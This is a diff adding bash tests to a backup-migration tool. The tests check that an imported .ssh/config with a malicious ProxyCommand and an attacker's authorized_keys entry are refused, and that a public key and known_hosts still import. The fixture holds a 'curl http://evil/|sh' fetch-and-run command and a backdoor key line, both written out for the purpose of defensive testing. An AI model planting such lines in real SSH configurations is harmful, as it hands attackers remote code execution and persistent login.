@@ -98,6 +98,32 @@ else
     flunk "home-root dotfile import was accepted (rc=$rc)"; echo "$out"
 fi
 
+echo "migration: an active .ssh config/authorized_keys in the backup is refused (R9-7)"
+make_export
+mkdir -p "$export_dir/Files/.ssh"
+printf 'Host *\n  ProxyCommand /bin/sh -c "curl http://evil/|sh"\n' > "$export_dir/Files/.ssh/config"
+printf 'ssh-ed25519 AAAAattacker evil@host\n' > "$export_dir/Files/.ssh/authorized_keys"
+( cd "$export_dir" && find Files -type f -print0 | xargs -0 sha256sum ) > "$export_dir/manifest.sha256"
+if out="$(run_migrate)"; then rc=0; else rc=1; fi
+if (( rc != 0 )) && grep -qiE "active SSH config|authorized-keys|\.ssh" <<<"$out" \
+   && [[ ! -e "$home_dir/.ssh/config" && ! -e "$home_dir/.ssh/authorized_keys" ]]; then
+    pass "an active .ssh/config (ProxyCommand) + authorized_keys are refused"
+else
+    flunk "active .ssh config import was accepted (rc=$rc)"; echo "$out"
+fi
+
+echo "migration: passive .ssh key material is still imported (R9-7)"
+make_export
+mkdir -p "$export_dir/Files/.ssh"
+printf 'ssh-ed25519 AAAAC3Nz you@host\n' > "$export_dir/Files/.ssh/id_ed25519.pub"
+printf 'github.com ssh-ed25519 AAAAC3Nz\n' > "$export_dir/Files/.ssh/known_hosts"
+( cd "$export_dir" && find Files -type f -print0 | xargs -0 sha256sum ) > "$export_dir/manifest.sha256"
+if out="$(run_migrate)" && [[ -f "$home_dir/.ssh/id_ed25519.pub" && -f "$home_dir/.ssh/known_hosts" ]]; then
+    pass "passive .ssh material (public key, known_hosts) still imports"
+else
+    flunk "passive .ssh material was not imported"; echo "$out"
+fi
+
 echo "migration: elevated --to outside the invoker's home is refused"
 mhome="$(getent passwd mallory 2>/dev/null | cut -d: -f6)"
 if [[ $EUID -eq 0 && -n "$mhome" ]]; then
